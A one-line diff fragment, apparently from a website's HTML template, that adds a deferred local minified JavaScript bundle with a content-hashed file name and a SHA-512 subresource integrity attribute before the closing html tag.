+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
